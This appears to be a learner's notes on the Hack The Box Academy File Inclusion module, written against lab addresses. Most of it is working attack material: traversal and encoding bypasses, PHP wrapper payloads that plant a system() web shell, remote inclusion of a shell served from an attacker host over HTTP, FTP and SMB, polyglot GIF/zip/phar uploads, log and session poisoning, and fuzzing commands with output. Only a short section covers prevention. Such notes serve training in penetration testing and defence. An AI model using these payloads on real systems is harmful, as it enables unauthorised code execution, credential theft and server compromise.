# File Inclusion

**Platform:** Hack The Box Academy  
**Module:** File Inclusion  
**Sections:** 11  
**Difficulty:** Medium  
**Category:** Offensive Security / Web Application Penetration Testing  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Table of Contents

1. [Overview](#overview)
2. [Vulnerable Code Patterns by Language](#vulnerable-code-patterns-by-language)
3. [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
   - [Basic LFI](#basic-lfi)
   - [Path Traversal](#path-traversal)
   - [Filter Bypasses](#filter-bypasses)
   - [Appended Extension Bypasses](#appended-extension-bypasses)
4. [PHP Filters — Source Code Disclosure](#php-filters--source-code-disclosure)
5. [PHP Wrappers — Remote Code Execution](#php-wrappers--remote-code-execution)
   - [data:// Wrapper](#data-wrapper)
   - [php://input Wrapper](#phpinput-wrapper)
   - [expect:// Wrapper](#expect-wrapper)
6. [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
   - [HTTP RFI](#http-rfi)
   - [FTP RFI](#ftp-rfi)
   - [SMB RFI (Windows)](#smb-rfi-windows)
7. [LFI and File Uploads](#lfi-and-file-uploads)
   - [Malicious Image Upload](#malicious-image-upload)
   - [Zip Wrapper Upload](#zip-wrapper-upload)
   - [Phar Wrapper Upload](#phar-wrapper-upload)
8. [Log Poisoning](#log-poisoning)
   - [PHP Session Poisoning](#php-session-poisoning)
   - [Apache and Nginx Log Poisoning](#apache-and-nginx-log-poisoning)
   - [Other Log Poisoning Vectors](#other-log-poisoning-vectors)
9. [Automated Scanning](#automated-scanning)
   - [Fuzzing Parameters](#fuzzing-parameters)
   - [Fuzzing LFI Payloads](#fuzzing-lfi-payloads)
   - [Fuzzing Server Files](#fuzzing-server-files)
10. [LFI Tools](#lfi-tools)
11. [File Inclusion Prevention](#file-inclusion-prevention)
12. [Key Tools Reference](#key-tools-reference)
13. [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Overview

File Inclusion vulnerabilities arise when a web application dynamically loads content from a path that is partially or wholly controlled by the user — without sufficient validation. The two primary variants are:

| Type | Description | Requires |
|------|-------------|--------|
| **Local File Inclusion (LFI)** | Read files from the back-end server's file system | Access to the vulnerable parameter |
| **Remote File Inclusion (RFI)** | Execute a remotely hosted malicious script | `allow_url_include = On` in PHP config |

### Why File Inclusion is Critical

Even a basic LFI with read-only capability can yield:
- `/etc/passwd` — local user account enumeration
- SSH private keys (`/home/user/.ssh/id_rsa`) — direct server access
- Application source code — reveals credentials, logic flaws, and other vulnerabilities
- Config files (`config.php`, `database.yml`) — database credentials, API keys
- Log files — basis for log poisoning → RCE

Under the right conditions, LFI escalates to full Remote Code Execution through PHP wrappers, log poisoning, session poisoning, or file upload chaining.

---

## Vulnerable Code Patterns by Language

### Function Capability Matrix

| Function | Read Content | Execute | Remote URL |
|----------|-------------|---------|----------|
| **PHP** `include()` / `include_once()` | ✅ | ✅ | ✅ |
| **PHP** `require()` / `require_once()` | ✅ | ✅ | ❌ |
| **PHP** `file_get_contents()` | ✅ | ❌ | ✅ |
| **PHP** `fopen()` / `file()` | ✅ | ❌ | ❌ |
| **NodeJS** `fs.readFile()` | ✅ | ❌ | ❌ |
| **NodeJS** `res.render()` | ✅ | ✅ | ❌ |
| **Java** `include` | ✅ | ❌ | ❌ |
| **Java** `import` | ✅ | ✅ | ✅ |
| **.NET** `@Html.Partial()` | ✅ | ❌ | ❌ |
| **.NET** `Response.WriteFile()` | ✅ | ❌ | ❌ |
| **.NET** `include` | ✅ | ✅ | ✅ |

> **Key concept:** Functions that both read and execute content are the high-value targets — they enable code execution via log poisoning, wrapper injection, and file upload chaining. Read-only functions still enable data exfiltration.

### PHP (Most Common)

```php
// Vulnerable — language parameter passed directly to include()
if (isset($_GET['language'])) {
    include($_GET['language']);
}

// Also vulnerable — any of these accept LFI if path is user-controlled
include_once($_GET['language']);
require($_GET['language']);
require_once($_GET['language']);
file_get_contents($_GET['language']);
```

### NodeJS

```javascript
// Vulnerable — readFile path from user input
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}

// Vulnerable — Express render with URL path parameter
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

### Java JSP

```jsp
<!-- Vulnerable — include from request parameter -->
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>

<!-- Vulnerable — import with remote URL support -->
<c:import url= "<%= request.getParameter('language') %>"/>
```

### .NET

```csharp
// Vulnerable — WriteFile from query string
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
}

// Vulnerable — Html.Partial from query string
@Html.Partial(HttpContext.Request.Query['language'])
```

---

## Local File Inclusion (LFI)

### Basic LFI

When the full path is passed directly to the inclusion function with no prefix:

```php
include($_GET['language']);
```

Any path including absolute paths can be read:

```
http://10.129.43.173:32772/index.php?language=/etc/passwd
```

Common readable files:

| File | OS | Contents |
|------|----|--------|
| `/etc/passwd` | Linux | Local user accounts |
| `/etc/shadow` | Linux | Password hashes (root required) |
| `/etc/hosts` | Linux | Local DNS mappings |
| `C:\Windows\boot.ini` | Windows | Boot configuration |
| `C:\Windows\System32\drivers\etc\hosts` | Windows | Local DNS mappings |
| `C:\inetpub\wwwroot\web.config` | Windows/IIS | Application config |

---

### Path Traversal

When the developer prepends a directory to the user input:

```php
include("./languages/" . $_GET['language']);
```

Use `../` to traverse back to the root before specifying the target file:

```
http://10.129.43.173:32772/index.php?language=../../../../etc/passwd
```

If the number of `../` is uncertain, use many — extra traversals land back at root regardless:

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.43.173:32772/index.php?language=../../../../../../../../../../etc/passwd"
```

---

### Filter Bypasses

#### Non-Recursive str_replace Bypass

When the application strips `../` using a non-recursive `str_replace`:

```php
// Strips ../ only once — not recursively
$language = str_replace('../', '', $_GET['language']);
```

**Bypass:** Use `....//` — after stripping `../`, the remaining characters reconstruct `../`:

```
....//....//....//....//etc/passwd
```

Other variants:
- `..././` — after stripping `./`, leaves `../`
- `....\\/ ` — escapes the slash
- `....////` — multiple trailing slashes

#### URL Encoding Bypass

When the application filters `.` and `/` as literal characters:

```
# Single URL encode — may still be filtered
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encode — bypasses single-decode validation
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

> **How double encoding works:** The server performs one URL decode, converting `%252e` → `%2e`. The validation check sees `%2e` (not a literal `.`) and passes. A second decode step later in the process converts `%2e` → `.`, reconstructing the path traversal.

#### Approved Path Bypass

When the application requires the path to begin with a specific directory:

```php
if(preg_match('/^\.\./languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
}
```

**Bypass:** Start with the approved path, then traverse out:

```
http://10.129.43.173:32772/index.php?language=./languages/../../../../etc/passwd
```

---

### Appended Extension Bypasses

When the application appends `.php` to all user input:

```php
include("./languages/" . $_GET['language'] . ".php");
```

#### Path Truncation (PHP < 5.3/5.4)

PHP had a 4096-character string limit on paths. Appended extensions beyond the limit are truncated:

```bash
# Generate payload with 4096+ characters
Hackerpatel007_1@htb[/htb]$ echo -n "non_existing_dir/../../../etc/passwd/" \
  && for i in {1..2048}; do echo -n "./"; done

non_existing_dir/../../../etc/passwd/./././<SNIP>
```

When the full path reaches 4096 characters, the appended `.php` is truncated.

#### Null Byte Injection (PHP < 5.5)

```
http://10.129.43.173:32772/index.php?language=/etc/passwd%00
```

The null byte `%00` terminates the string at the OS level — the `.php` suffix is appended to the string but ignored by the file system.

---

## PHP Filters — Source Code Disclosure

PHP's `php://filter` wrapper applies transformations to a file stream before returning it. The `convert.base64-encode` filter reads PHP files and base64-encodes them — bypassing PHP execution and returning the raw source.

### Step 1 — Fuzz for PHP Files

```bash
Hackerpatel007_1@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u 'http://10.129.43.173:32772/FUZZ.php'
```

```
index                   [Status: 200, Size: 2652]
config                  [Status: 302, Size: 0]
```

> Scan for all status codes including 301, 302, 403 — LFI can read files regardless of HTTP access status.

### Step 2 — Read PHP Source via Base64 Filter

```
http://10.129.43.173:32772/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

The response returns a base64 string instead of the executed PHP output.

### Step 3 — Decode the Source

```bash
Hackerpatel007_1@htb[/htb]$ echo 'PD9waHAK...SNIP...' | base64 -d
```

```php
<?php
// config.php decoded
$db_host = 'localhost';
$db_user = 'root';
$db_pass = 'HTB{flag_redacted}';
$db_name = 'inlanefreight';
?>
```

> **Tip:** View page source (`CTRL+U`) when copying the base64 string — the browser may wrap or truncate long lines that the rendered view shows incorrectly.

---

## PHP Wrappers — Remote Code Execution

### data:// Wrapper

Requires `allow_url_include = On` in `php.ini`. Enables embedding PHP code directly in the URL:

**Step 1 — Verify allow_url_include:**

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.43.173:32772/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | grep -o 'W1BIUF0.*' | base64 -d | grep allow_url_include

allow_url_include = On
```

**Step 2 — Base64-encode the web shell:**

```bash
Hackerpatel007_1@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

**Step 3 — Inject via data wrapper:**

```bash
Hackerpatel007_1@htb[/htb]$ curl -s "http://10.129.43.173:32772/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### php://input Wrapper

Requires `allow_url_include = On`. Passes PHP code in the POST body instead of the URL:

```bash
Hackerpatel007_1@htb[/htb]$ curl -s -X POST \
  --data '<?php system($_GET["cmd"]); ?>' \
  "http://10.129.43.173:32772/index.php?language=php://input&cmd=id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> If the function only accepts POST, embed the command directly: `<?php system('id'); ?>`

---

### expect:// Wrapper

The `expect` extension is an external module that enables direct command execution via URL. Must be manually installed and enabled:

**Verify expect is enabled:**

```bash
Hackerpatel007_1@htb[/htb]$ echo 'W1BIUF0KCjs7...' | base64 -d | grep expect

extension=expect
```

**Execute commands:**

```bash
Hackerpatel007_1@htb[/htb]$ curl -s "http://10.129.43.173:32772/index.php?language=expect://id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Remote File Inclusion (RFI)

RFI allows the application to load and execute a script hosted on the attacker's machine. Requires `allow_url_include = On`.

### Verify RFI

Test by including localhost first — avoids triggering external firewalls:

```
http://10.129.43.173:32772/index.php?language=http://127.0.0.1:80/index.php
```

If the page content changes or doubles, RFI is confirmed.

---

### HTTP RFI

```bash
# Step 1 — Create the remote web shell
Hackerpatel007_1@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2 — Serve it on a common port (80/443 bypass firewalls)
Hackerpatel007_1@htb[/htb]$ sudo python3 -m http.server 80

# Step 3 — Include via RFI
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.43.173:32772/index.php?language=http://10.10.16.36/shell.php&cmd=id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### FTP RFI

Use when HTTP ports are blocked or the `http://` string is WAF-filtered:

```bash
# Start FTP server with anonymous access
Hackerpatel007_1@htb[/htb]$ sudo python -m pyftpdlib -p 21

# Include via FTP
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.43.173:32772/index.php?language=ftp://10.10.16.36/shell.php&cmd=id"

# With FTP credentials if anonymous fails
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.43.173:32772/index.php?language=ftp://user:pass@10.10.16.36/shell.php&cmd=id"
```

---

### SMB RFI (Windows)

On Windows servers, `allow_url_include` is **not required** — Windows natively resolves UNC paths:

```bash
# Start SMB share with anonymous access
Hackerpatel007_1@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)

# Include via UNC path
http://10.129.43.173:32772/index.php?language=\\10.10.16.36\share\shell.php&cmd=whoami
```

```
NT AUTHORITY\IUSR
```

> Most effective when the attacker and target are on the same network — external SMB is frequently blocked at the perimeter.

---

## LFI and File Uploads

When a file upload function is available, combine it with LFI to achieve RCE — even if the upload form itself has no vulnerabilities.

### Malicious Image Upload

```bash
# Create a PHP web shell disguised as a GIF
# GIF8 magic bytes ensure MIME type validation passes
Hackerpatel007_1@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Upload `shell.gif` through the application's profile image upload. Inspect the image source in the page HTML to find its server-side path:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Include the uploaded image via LFI to execute the embedded PHP:

```
http://10.129.43.173:32772/index.php?language=./profile_images/shell.gif&cmd=id
```

```
GIF8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `GIF8` string precedes the output — expected behaviour; the PHP engine skips it and executes the `<?php ?>` block.

---

### Zip Wrapper Upload

```bash
# Create PHP shell and zip it with a .jpg extension
Hackerpatel007_1@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
Hackerpatel007_1@htb[/htb]$ zip shell.jpg shell.php
```

Include via zip wrapper (URL-encode the `#` as `%23`):

```
http://10.129.43.173:32772/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

---

### Phar Wrapper Upload

```php
<?php
// shell.php — generates the phar archive
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
# Compile phar and rename to .jpg for upload
Hackerpatel007_1@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Include via phar wrapper:

```
http://10.129.43.173:32772/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

---

## Log Poisoning

Log poisoning works by writing PHP code into any server-side file that:
1. Contains attacker-controlled input (e.g. User-Agent, username)
2. Can be read via LFI

When the poisoned log is included, the PHP engine executes the injected code.

### PHP Session Poisoning

PHP session files store user session data at:
- **Linux:** `/var/lib/php/sessions/sess_<PHPSESSID>`
- **Windows:** `C:\Windows\Temp\sess_<PHPSESSID>`

**Step 1 — Read the session file via LFI:**

```
http://10.129.43.173:32772/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

```
page|s:3:"es.php";preference|s:2:"en";
```

**Step 2 — Poison the session by injecting PHP via the `language` parameter:**

```
http://10.129.43.173:32772/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

This writes `<?php system($_GET["cmd"]); ?>` into the session file's `page` field.

**Step 3 — Include the poisoned session file:**

```
http://10.129.43.173:32772/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Note:** The session file is overwritten on every request — the poison must be re-injected each time if you lose the session or need to execute a new command. Use the web shell to write a persistent PHP shell to disk immediately.

---

### Apache and Nginx Log Poisoning

**Default log locations:**

| Server | Linux | Windows |
|--------|-------|-------|
| Apache access.log | `/var/log/apache2/access.log` | `C:\xampp\apache\logs\access.log` |
| Apache error.log | `/var/log/apache2/error.log` | `C:\xampp\apache\logs\error.log` |
| Nginx access.log | `/var/log/nginx/access.log` | `C:\nginx\log\access.log` |

> **Privilege note:** Nginx logs are readable by `www-data` by default. Apache logs typically require `root` or `adm` group membership — may not be readable on well-configured systems.

**Step 1 — Verify log readability:**

```
http://10.129.43.173:32772/index.php?language=/var/log/apache2/access.log
```

**Step 2 — Poison the User-Agent header:**

```bash
Hackerpatel007_1@htb[/htb]$ echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > Poison
Hackerpatel007_1@htb[/htb]$ curl -s "http://10.129.43.173:32772/index.php" -H @Poison
```

Or directly in Burp Repeater — change:

```http
User-Agent: Mozilla/5.0 ...
```

to:

```http
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 3 — Execute commands via the poisoned log:**

```
http://10.129.43.173:32772/index.php?language=/var/log/apache2/access.log&cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Other Log Poisoning Vectors

| Service | Log Location | Poison Method |
|---------|-------------|-------------|
| SSH | `/var/log/sshd.log` | Login with username `<?php system($_GET['cmd']); ?>` |
| Mail | `/var/log/mail` | Send email with PHP code in subject/body |
| FTP (vsftpd) | `/var/log/vsftpd.log` | Login with PHP code as username |
| `/proc/self/environ` | Linux `/proc/` | User-Agent reflected in process environment |
| `/proc/self/fd/N` | Linux `/proc/` | File descriptors (N = 0–50) containing request data |

---

## Automated Scanning

### Fuzzing Parameters

Discover hidden GET parameters not linked to any forms:

```bash
Hackerpatel007_1@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://10.129.43.173:32772/index.php?FUZZ=value' \
  -fs 2287
```

```
language                    [Status: 200, Size: xxx]
```

---

### Fuzzing LFI Payloads

```bash
Hackerpatel007_1@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://10.129.43.173:32772/index.php?language=FUZZ' \
  -fs 2287
```

```
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd      [Status: 200, Size: 3661]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461]
../../../../etc/passwd                        [Status: 200, Size: 3661]
```

---

### Fuzzing Server Files

**Web root discovery:**

```bash
Hackerpatel007_1@htb[/htb]$ ffuf \
  -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://10.129.43.173:32772/index.php?language=../../../../FUZZ/index.php' \
  -fs 2287
```

```
/var/www/html/          [Status: 200, Size: 0]
```

**Server logs and config discovery:**

```bash
Hackerpatel007_1@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ \
  -u 'http://10.129.43.173:32772/index.php?language=../../../../FUZZ' \
  -fs 2287
```

```
/etc/apache2/apache2.conf    [Status: 200, Size: 9511]
/etc/apache2/envvars         [Status: 200, Size: 4069]
/etc/hosts                   [Status: 200, Size: 2461]
/var/log/apache2/access.log  [Status: 200, Size: ...]
```

**Read Apache config to find log path:**

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.43.173:32772/index.php?language=../../../../etc/apache2/apache2.conf"

ServerAdmin webmaster@localhost
DocumentRoot /var/www/html
ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined
```

**Read envvars to resolve the variable:**

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.43.173:32772/index.php?language=../../../../etc/apache2/envvars"

export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
```

Confirmed: logs at `/var/log/apache2/access.log`.

---

## LFI Tools

| Tool | Language | Notes |
|------|----------|------|
| **LFISuite** | Python 2 | Automated LFI detection and exploitation |
| **LFiFreak** | Python 2 | Multiple LFI techniques with fuzzer |
| **liffy** | Python 2 | Supports log poisoning and RCE chains |

> **Warning:** All major LFI tools rely on Python 2, which is end-of-life. Use them as a starting point only — manual testing remains the most reliable approach and catches edge cases these tools miss.

---

## File Inclusion Prevention

### Input Validation — Avoid User-Controlled Paths

```php
// WRONG — user input directly in include
include($_GET['language']);

// BETTER — map input to allowed files via whitelist
$allowed_pages = ['en' => 'lang/en.php', 'es' => 'lang/es.php'];
$page = $_GET['language'];
if (array_key_exists($page, $allowed_pages)) {
    include($allowed_pages[$page]);
} else {
    include($allowed_pages['en']); // default
}
```

### Preventing Directory Traversal

```php
// Use basename() to extract only the filename — strips all path components
$fileName = basename($_GET['language']);
include("./languages/" . $fileName);

// Recursively strip ../ to prevent bypass with ....//
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
}
```

> **Limitation:** `basename()` prevents traversal but prevents legitimate subdirectory paths. Choose based on the application's requirements.

### PHP Configuration Hardening (`php.ini`)

```ini
; Disable remote file inclusion
allow_url_fopen = Off
allow_url_include = Off

; Restrict file access to web root only
open_basedir = /var/www

; Disable dangerous modules
; Disable PHP Expect module
; Disable mod_userdir in Apache
```

### Docker / Container Isolation

Running web applications inside Docker containers limits the blast radius of a successful LFI — the attacker can only read files within the container's file system, not the host system.

### Web Application Firewall

ModSecurity and cloud WAFs detect common LFI signatures like `../`, `%2e%2e`, `/etc/passwd`, and `php://`. Deploy in **permissive mode** first to baseline normal traffic and prevent false positives before switching to blocking mode.

---

## Key Tools Reference

| Command | Purpose |
|---------|--------|
| `curl "http://10.129.43.173:32772/?language=/etc/passwd"` | Basic absolute path LFI test |
| `curl "http://10.129.43.173:32772/?language=../../../../etc/passwd"` | Path traversal LFI |
| `curl "http://10.129.43.173:32772/?language=....//....//....//etc/passwd"` | Non-recursive str_replace bypass |
| `curl "http://10.129.43.173:32772/?language=./languages/../../../../etc/passwd"` | Approved path bypass |
| `curl "http://10.129.43.173:32772/?language=%2e%2e%2f%2e%2e%2fetc%2fpasswd"` | URL encoded traversal bypass |
| `curl "http://10.129.43.173:32772/?language=php://filter/read=convert.base64-encode/resource=config"` | PHP filter source code disclosure |
| `echo 'base64...' \| base64 -d` | Decode PHP filter output |
| `curl "http://10.129.43.173:32772/?language=data://text/plain;base64,<b64_shell>&cmd=id"` | data:// wrapper RCE |
| `curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.43.173:32772/?language=php://input&cmd=id"` | php://input wrapper RCE |
| `curl "http://10.129.43.173:32772/?language=expect://id"` | expect:// wrapper RCE (if enabled) |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && sudo python3 -m http.server 80` | Serve RFI payload |
| `curl "http://10.129.43.173:32772/?language=http://10.10.16.36/shell.php&cmd=id"` | HTTP RFI |
| `sudo python -m pyftpdlib -p 21` | Start FTP server for RFI |
| `impacket-smbserver -smb2support share $(pwd)` | Start SMB share for Windows RFI |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious GIF for image upload LFI |
| `echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > Poison && curl -s "http://10.129.43.173:32772/" -H @Poison` | Poison Apache access log |
| `ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://10.129.43.173:32772/?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
| `ffuf -w burp-parameter-names.txt:FUZZ -u 'http://10.129.43.173:32772/index.php?FUZZ=value' -fs 2287` | Fuzz hidden parameters |
| `ffuf -w default-web-root-linux.txt:FUZZ -u 'http://10.129.43.173:32772/?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz for web root |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1083 | — | File and Directory Discovery — LFI reading `/etc/passwd`, config files, SSH keys |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — PHP filter disclosing DB credentials from `config.php` |
| T1190 | — | Exploit Public-Facing Application — LFI/RFI via vulnerable file inclusion function |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — RCE via wrappers, log poisoning, file upload chaining |
| T1505 | T1505.003 | Server Software Component: Web Shell — writing web shell via `data://`, session poisoning, or upload + LFI |
| T1071 | T1071.001 | Application Layer Protocol: Web Protocols — RFI payload delivery over HTTP/FTP |
| T1210 | — | Exploitation of Remote Services — SMB RFI on Windows targets |
| T1040 | — | Network Sniffing — FTP RFI server capturing credentials if auth required |
| T1562 | T1562.001 | Impair Defences: Disable or Modify Tools — bypassing WAF/filter rules via encoding and path manipulation |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
